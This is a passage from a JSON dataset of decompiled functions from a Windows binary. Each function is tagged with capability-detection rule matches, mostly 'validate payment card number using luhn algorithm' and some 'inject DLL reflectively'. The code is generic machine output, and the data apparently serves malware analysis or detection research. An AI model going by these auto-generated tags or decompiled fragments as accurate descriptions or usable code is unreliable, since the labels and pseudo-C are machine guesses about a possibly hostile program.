*piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2312 + -0x10) + 4))();\n                }\n                fcn.004018d0();\n                fcn.00402ed0();\n                piVar6 = iStack2308 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack2308 + -0x10) + 4))(iStack2308 + -0x10);\n                }\n                fcn.004018d0();\n                fcn.00402ed0(0x76c7f0);\n                uStack4 = 0xffffffff;\n                LOCK();\n                iVar5 = *0x76c7ec + -1;\n                iVar7 = *0x76c7ec + -1;\n                bVar10 = *0x76c7ec == 1;\n                *0x76c7ec = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x76c7e0 + 4))(0x76c7e0);\n                }\n            }\n            iStack2296 = iStack2296 + 1;\n            puVar1 = param_3 + -1 + iStack2296;\n            *puVar1 = *puVar1 ^ *(&iStack2288 + (*(&iStack2288 + uStack3016) + uVar2) % 0x8df);\n        } while (param_4 != 0);\n    }\n    *in_FS_OFFSET = piStack12;\n    fcn.004566a8(in_stack_fffff430);\n    return;\n}\n",
        "token_count": 68979
    },
    "0040d280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nint32_t * fcn.0040d280(int32_t *param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x482f39;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 0;\n    if (*(*param_2 + -0x10) != NULL) {\n        piVar2 = (**(**(*param_2 + -0x10) + 0x10))(uVar1);\n        if (piVar2 != NULL) goto code_r0x0040d2d9;\n    }\n    piVar2 = fcn.00423280();\n    piVar2 = (**(*piVar2 + 0x10))();\ncode_r0x0040d2d9:\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    iVar3 = (**(*piVar2 + 0xc))();\n    *param_1 = iVar3 + 0x10;\n    uStack4 = 0;\n    fcn.00402100(param_1, *param_2, *(*param_2 + -0xc), *param_3, *(*param_3 + -0xc));\n    *in_FS_OFFSET = piStack12;\n    return param_1;\n}\n",
        "token_count": 384
    },
    "0040d340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040d340(int32_t *param_1, int32_t *param_2, char *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x482f79;\n    piStack12 = *in_FS_OFFSET;\n    uVar2 = *0x4a9ec8 ^ &stack0xffffffe4;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 0;\n    if (*(*param_2 + -0x10) != NULL) {\n        piVar3 = (**(**(*param_2 + -0x10) + 0x10))(uVar2);\n        if (piVar3 != NULL) goto code_r0x0040d39b;\n    }\n    piVar3 = fcn.00423280();\n    piVar3 = (**(*piVar3 + 0x10))();\ncode_r0x0040d39b:\n    if (piVar3 == NULL) {\n        piVar3 = fcn.00401070(0x80004005);\n    }\n    iVar4 = (**(*piVar3 + 0xc))();\n    *param_1 = iVar4 + 0x10;\n    uStack4 = 0;\n    if (param_3 == NULL) {\n        iVar4 = 0;\n    }\n    else {\n        pcVar5 = param_3;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        iVar4 = pcVar5 - (param_3 + 1);\n    }\n    fcn.00402100(param_1, *param_2, *(*param_2 + -0xc), param_3, iVar4);\n    *in_FS_OFFSET = piStack12;\n    return param_1;\n}\n",
        "token_count": 471
    },
    "0040d530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040d530(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403ef0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 162
    },
    "0040e880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040e880(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004561f2(param_1, param_2, param_3, param_4);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 83
    },
    "0040ea80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0040ea80(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint *puVar2;\n    uint *puVar3;\n    uint uStack44;\n    \n    if (param_2 == NULL) {\n        uStack44 = 0x80004005;\n        fcn.00401070();\n        param_1 = extraout_ECX;\n    }\n    puVar2 = &uStack44;\n    iVar1 = fcn.004573df(&stack0xffffffd8, param_1);\n    if (iVar1 != 0) {\n        return NULL;\n    }\n    puVar3 = param_2;\n    for (iVar1 = 9; puVar2 = puVar2 + 1,  iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar3 = puVar3 + 1;\n    }\n    return param_2;\n}\n",
        "token_count": 227
    },
    "0040ead0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ead0(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [20];\n    int32_t iStack16;\n    \n    iVar1 = fcn.004573df(auStack36, param_1);\n    if (iVar1 == 0) {\n        return iStack16 + 0x76c;\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "0040eb00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040eb00(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [16];\n    int32_t iStack20;\n    \n    iVar1 = fcn.004573df(auStack36, param_1);\n    if (iVar1 == 0) {\n        return iStack20 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "0040eb40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040eb40(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [12];\n    uint32_t uStack24;\n    \n    iVar1 = fcn.004573df(auStack36, param_1);\n    return ~-(iVar1 != 0) & uStack24;\n}\n",
        "token_count": 78
    },
    "0040eb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040eb60(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [8];\n    uint uStack28;\n    \n    iVar1 = fcn.004573df(auStack36, param_1);\n    if (iVar1 == 0) {\n        return uStack28;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 83
    },
    "0040eb90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040eb90(uint param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [4];\n    uint uStack32;\n    \n    iVar1 = fcn.004573df(auStack36, param_1);\n    if (iVar1 == 0) {\n        return uStack32;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 83
    },
    "0040ebc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040ebc0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint auStack36 [9];\n    \n    iVar1 = fcn.004573df(auStack36, param_1);\n    if (iVar1 == 0) {\n        return auStack36[0];\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 80
    },
    "0045780d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045780d(void)\n\n{\n    fcn.004577e9(0, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "0040fcb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040fcb0(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x18b, 0, 0);\n    iVar3 = 0;\n    if (0 < iVar2) {\n        do {\n            (*pcVar1)(*(param_1 + 0x20), 0x199, iVar3, 0);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 169
    },
    "0040fd00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040fd00(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    uVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x18b, 0, 0);\n    uVar3 = fcn.0040fcb0(unaff_ESI);\n    while (uVar3 = uVar3 + 1,  uVar3 < uVar2) {\n        (*pcVar1)(*(param_1 + 0x20), 0x199, uVar3, 0);\n    }\n    uVar3 = (uVar3 < 0) - 1 & uVar3;\n    if (uVar2 < uVar3) {\n        uVar3 = uVar2;\n    }\n    return uVar3;\n}\n",
        "token_count": 228
    },
    "0040fd60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040fd60(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x18b, 0, 0);\n    iVar3 = 0;\n    if (0 < iVar2) {\n        do {\n            (*pcVar1)(*(param_1 + 0x20), 0x199, iVar3, 0);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 169
    },
    "0040ff20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0040ff20(int32_t *param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *extraout_ECX_00;\n    int32_t unaff_retaddr;\n    \n    if (param_4 == NULL) {\n        fcn.00401070(0x80004005);\n        param_4 = extraout_ECX;\n    }\n    if (unaff_retaddr != 0) goto code_r0x0040ff51;\n    if (param_2 == 0) goto code_r0x0040ff51;\n    do {\n        fcn.00401070();\n        param_4 = extraout_ECX_00;\ncode_r0x0040ff51:\n        iVar1 = (***param_4)(param_2, 1);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00401430();\n        }\n        *param_1 = iVar1 + 0x10;\n    } while ((param_2 < 0) || (*(iVar1 + 8) < param_2));\n    *(iVar1 + 4) = param_2;\n    *(param_2 + *param_1) = 0;\n    fcn.00456177(*param_1, param_2, unaff_retaddr, param_2);\n    return param_1;\n}\n",
        "token_count": 324
    },
    "00410560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410560(void)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.004170b4(0x30);\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n    }\n    if (puVar1 + 1 != NULL) {\n        puVar1[1] = 0;\n    }\n    if (puVar1 + 2 != NULL) {\n        puVar1[2] = 0;\n    }\n    *(puVar1 + 0xb) = 1;\n    *(puVar1 + 0x2d) = 0;\n    return;\n}\n",
        "token_count": 143
    },
    "004105e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004105e0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401070(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401070(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[1] = iVar2 + 0x10;\n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401070(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[2] = iVar2 + 0x10;\n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401070(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[3] = iVar2 + 0x10;\n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401070(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[4] = iVar2 + 0x10;\n    param_1[6] = 0;\n    return param_1;\n}\n",
        "token_count": 421
    },
    "00410860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00410860(uint *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    if (iVar2 == 0) {\n        fcn.00401070(0x80004005);\n        iVar2 = extraout_ECX;\n    }\n    uVar1 = fcn.00456b7a(*param_1, iVar2);\n    return uVar1 & 0xffffff00 | uVar1 < 0;\n}\n",
        "token_count": 134
    },
    "00410950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410950(code **param_1)\n\n{\n    *param_1 = vtable.std::logic_error.0;\n    if (0xf < param_1[9]) {\n        fcn.004170df(param_1[4]);\n    }\n    param_1[9] = 0xf;\n    param_1[8] = NULL;\n    *(param_1 + 4) = 0;\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0045839d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00410e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00410e30(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    \n    iVar1 = *param_1;\n    iVar2 = *(iVar1 + -0xc);\n    if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - iVar2) < 0) {\n        fcn.00401760(iVar2);\n    }\n    uVar4 = fcn.00457098(*param_1, iVar2 + 1);\n    fcn.0040e7f0(uVar4);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return param_1;\n    }\n    fcn.00401070(0x80070057);\n    pcVar3 = swi(3);\n    piVar5 = (*pcVar3)();\n    return piVar5;\n}\n",
        "token_count": 260
    },
    "00410e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar ** __fastcall fcn.00410e90(char **param_1)\n\n{\n    char *pcVar1;\n    char *arg_8h;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint uVar5;\n    char **ppcVar6;\n    \n    pcVar4 = *param_1;\n    iVar3 = fcn.004560af(*pcVar4);\n    while (iVar3 != 0) {\n        pcVar4 = fcn.00455f19(pcVar4);\n        iVar3 = fcn.004560af(*pcVar4);\n    }\n    pcVar1 = *param_1;\n    if (pcVar4 != pcVar1) {\n        if ((1U - *(pcVar1 + -4) | *(pcVar1 + -8) - *(pcVar1 + -0xc)) < 0) {\n            fcn.00401760(*(pcVar1 + -0xc));\n        }\n        arg_8h = *param_1;\n        iVar3 = *(arg_8h + -0xc) - (pcVar4 - pcVar1);\n        uVar5 = fcn.004561f2(arg_8h, iVar3 + 1, arg_8h + (pcVar4 - pcVar1), iVar3 + 1);\n        fcn.0040e7f0(uVar5);\n        if ((iVar3 < 0) || (*(*param_1 + -8) < iVar3)) {\n            fcn.00401070(0x80070057);\n            pcVar2 = swi(3);\n            ppcVar6 = (*pcVar2)();\n            return ppcVar6;\n        }\n        *(*param_1 + -0xc) = iVar3;\n        (*param_1)[iVar3] = '\\0';\n    }\n    return param_1;\n}\n",
        "token_count": 412
    },
    "00410f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00410f30(int32_t *param_1, int32_t *param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t extraout_ECX;\n    int32_t *unaff_retaddr;\n    \n    if (param_3 < 0) {\n        param_3 = 0;\n    }\n    if (param_4 < 0) {\n        param_4 = 0;\n    }\n    if (0x7fffffff - param_3 < param_4) {\n        fcn.00401070(0x80070057);\n        iVar2 = extraout_ECX;\n    }\n    else {\n        iVar2 = *param_1;\n        iVar1 = *(iVar2 + -0xc);\n        if (iVar1 < param_3 + param_4) {\n            param_4 = iVar1 - param_3;\n        }\n        if (iVar1 < param_3) {\n            param_4 = 0;\n        }\n        if ((param_3 == 0) && (param_4 == iVar1)) {\n            iVar2 = fcn.004017b0(iVar2 + -0x10);\n            *param_2 = iVar2 + 0x10;\n            return param_2;\n        }\n    }\n    if (*(iVar2 + -0x10) != NULL) {\n        iVar2 = (**(**(iVar2 + -0x10) + 0x10))();\n        if (iVar2 != 0) goto code_r0x00410fc3;\n    }\n    piVar3 = fcn.00423280();\n    iVar2 = (**(*piVar3 + 0x10))();\ncode_r0x00410fc3:\n    fcn.0040ff20(*param_1 + param_3, param_4, iVar2);\n    return unaff_retaddr;\n}\n",
        "token_count": 438
    },
    "00410fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00410fe0(int32_t *param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (param_3 < 0) {\n        param_3 = 0;\n    }\n    iVar1 = *param_1;\n    if (*(iVar1 + -0xc) <= param_3) {\n        iVar1 = fcn.004017b0(iVar1 + -0x10);\n        *param_2 = iVar1 + 0x10;\n        return param_2;\n    }\n    if (*(iVar1 + -0x10) != NULL) {\n        iVar1 = (**(**(iVar1 + -0x10) + 0x10))();\n        if (iVar1 != 0) goto code_r0x0041103b;\n    }\n    piVar2 = fcn.00423280();\n    iVar1 = (**(*piVar2 + 0x10))();\ncode_r0x0041103b:\n    fcn.0040ff20(*param_1, param_3, iVar1);\n    return param_2;\n}\n",
        "token_count": 266
    },
    "00411060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00411060(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (param_2 == 0) {\n        fcn.00401070(0x80070057);\n    }\n    iVar2 = fcn.00457e3d(param_2, param_2);\n    if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n        fcn.00401760(iVar2);\n    }\n    fcn.00458040(*param_1, iVar2 + 1, param_2, param_2);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return;\n    }\n    fcn.00401070(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 250
    },
    "004111d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004111d0(int32_t param_1, uint param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iStack16;\n    uint uStack12;\n    int32_t *piStack4;\n    \n    iVar1 = fcn.004108c0(param_3);\n    iStack16 = iVar1;\n    if (param_1 == 0) {\n        fcn.0045780d();\n    }\n    if (iVar1 != *(param_1 + 4)) {\n        iVar1 = *(iVar1 + 0xc);\n        if (iVar1 == 0) {\n            fcn.00401070(0x80004005);\n        }\n        iVar1 = fcn.00456b7a(*param_3, iVar1);\n        if (-1 < iVar1) {\n            piVar2 = &stack0xffffffe8;\n            goto code_r0x00411230;\n        }\n    }\n    uStack12 = *(param_1 + 4);\n    iStack16 = param_1;\n    piVar2 = &iStack16;\ncode_r0x00411230:\n    iVar1 = piVar2[1];\n    *piStack4 = *piVar2;\n    piStack4[1] = iVar1;\n    return;\n}\n",
        "token_count": 300
    },
    "00411280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00411280(code **param_1, uint param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t **in_FS_OFFSET;\n    uint32_t *puStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4834e8;\n    puStack12 = *in_FS_OFFSET;\n    puVar1 = *0x4a9ec8 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &puStack12;\n    fcn.004567e1();\n    *param_1 = vtable.std::logic_error.0;\n    param_1[8] = NULL;\n    param_1[9] = 0xf;\n    uStack4 = 0;\n    *(param_1 + 4) = 0;\n    fcn.00403e10(param_2, 0, 0xffffffff);\n    *in_FS_OFFSET = puVar1;\n    return param_1;\n}\n",
        "token_count": 230
    },
    "00411450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.00411450(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t **in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uint32_t *puStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483544;\n    puStack12 = *in_FS_OFFSET;\n    puVar1 = *0x4a9ec8 ^ &stack0xffffffe0;\n    *in_FS_OFFSET = &puStack12;\n    piVar2 = fcn.00423280();\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    iVar3 = (**(*piVar2 + 0xc))();\n    *param_1 = iVar3 + 0x10;\n    uStack8 = 0;\n    piVar2 = fcn.00423280();\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    iVar3 = (**(*piVar2 + 0xc))();\n    param_1[1] = iVar3 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 1);\n    piVar2 = fcn.00423280();\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    iVar3 = (**(*piVar2 + 0xc))();\n    param_1[2] = iVar3 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 2);\n    piVar2 = fcn.00423280();\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    iVar3 = (**(*piVar2 + 0xc))();\n    param_1[3] = iVar3 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 3);\n    piVar2 = fcn.00423280();\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    iVar3 = (**(*piVar2 + 0xc))();\n    param_1[4] = iVar3 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 4);\n    fcn.00402200(unaff_retaddr);\n    fcn.00402200(unaff_retaddr + 4);\n    fcn.00402200(unaff_retaddr + 8);\n    param_1[5] = *(unaff_retaddr + 0x14);\n    fcn.00402200(unaff_retaddr + 0xc);\n    fcn.00402200(unaff_retaddr + 0x10);\n    param_1[6] = *(unaff_retaddr + 0x18);\n    *in_FS_OFFSET = puVar1;\n    return param_1;\n}\n",
        "token_count": 732
    },
    "004115d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.004115d0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    uint32_t **in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uint32_t *puStack12;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 0x4835bc;\n    puStack12 = *in_FS_OFFSET;\n    puVar3 = *0x4a9ec8 ^ &stack0xffffffe0;\n    *in_FS_OFFSET = &puStack12;\n    iStack4 = 4;\n    piVar4 = fcn.00423280();\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00401070(0x80004005);\n    }\n    iVar5 = (**(*piVar4 + 0xc))();\n    *param_1 = iVar5 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 5);\n    piVar4 = fcn.00423280();\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00401070(0x80004005);\n    }\n    iVar5 = (**(*piVar4 + 0xc))();\n    param_1[1] = iVar5 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 6);\n    piVar4 = fcn.00423280();\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00401070(0x80004005);\n    }\n    iVar5 = (**(*piVar4 + 0xc))();\n    param_1[2] = iVar5 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 7);\n    piVar4 = fcn.00423280();\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00401070(0x80004005);\n    }\n    iVar5 = (**(*piVar4 + 0xc))();\n    param_1[3] = iVar5 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 8);\n    piVar4 = fcn.00423280();\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00401070(0x80004005);\n    }\n    iVar5 = (**(*piVar4 + 0xc))();\n    param_1[4] = iVar5 + 0x10;\n    uStack8 = CONCAT31(uStack8._1_3_, 9);\n    fcn.00402200(*0x10);\n    fcn.00402200(*0x10);\n    fcn.00402200(*0x10);\n    param_1[5] = unaff_retaddr;\n    fcn.00402200(&stack0x00000004);\n    fcn.00402200(&stack0x00000004);\n    param_1[6] = 0;\n    piVar4 = unaff_EBX + -4;\n    LOCK();\n    iVar5 = *piVar4;\n    *piVar4 = *piVar4 + -1;\n    if (iVar5 + -1 < 1) {\n        (**(**(unaff_EBX + -0x10) + 4))(unaff_EBX + -0x10);\n    }\n    piVar4 = param_1 + -1;\n    LOCK();\n    iVar5 = *piVar4;\n    *piVar4 = *piVar4 + -1;\n    if (iVar5 + -1 < 1) {\n        (**(*param_1[-4] + 4))(param_1 + -4);\n    }\n    puVar1 = puStack12 + -1;\n    LOCK();\n    uVar2 = *puVar1;\n    *puVar1 = *puVar1 - 1;\n    if (uVar2 - 1 < 1) {\n        (**(*puStack12[-4] + 4))(puStack12 + -4);\n    }\n    piVar4 = iStack4 + -4;\n    LOCK();\n    iVar5 = *piVar4;\n    *piVar4 = *piVar4 + -1;\n    if (iVar5 + -1 < 1) {\n        (**(**(iStack4 + -0x10) + 4))(iStack4 + -0x10);\n    }\n    piVar4 = unaff_retaddr + -4;\n    LOCK();\n    iVar5 = *piVar4;\n    *piVar4 = *piVar4 + -1;\n    if (iVar5 == 1 || iVar5 + -1 < 0) {\n        (**(**(unaff_retaddr + -0x10) + 4))(unaff_retaddr + -0x10);\n    }\n    *in_FS_OFFSET = puVar3;\n    return 